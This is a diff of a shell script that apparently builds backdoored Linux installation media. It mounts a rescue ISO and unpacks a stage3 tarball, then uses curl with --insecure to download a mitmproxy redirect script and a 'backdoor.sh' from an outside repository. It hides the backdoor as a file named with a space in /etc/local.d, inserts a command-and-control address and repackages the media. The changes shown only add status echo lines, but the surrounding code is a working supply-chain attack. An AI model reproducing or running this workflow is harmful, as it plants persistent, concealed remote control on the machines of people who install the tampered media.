@@ -90,16 +90,18 @@ mount -oloop ./${RESCUE_BASE} ./backdoor-iso-ro
 if [ $? -ge 1 ]; then
    echo "Error mounting ISO $RESCUE_BASE"
    exit
+else
+   echo "Please stand by,extracting files from installation media..."
 fi
 
 cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
 tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz
 unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
-
+echo "fetching mitmproxy inline script and backdoor script."
 # Get the backdoor scripts
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '
-
+echo "Applying Backdoor."
 # Update the scripts with the command and control
 sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
@@ -110,6 +112,8 @@ cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '
 chmod a+x ./backdoor-stage3/etc/local.d/' '
 chmod a+x ./backdoor-squash/etc/local.d/' '
 
+
+echo "Re-packaging backdoored installation media, you should probably go get a coffee or something, this will take a while..."
 # Pack backdoored files
 cd backdoor-stage3
 tar -cJf ../out/$STAGE3_BASE *
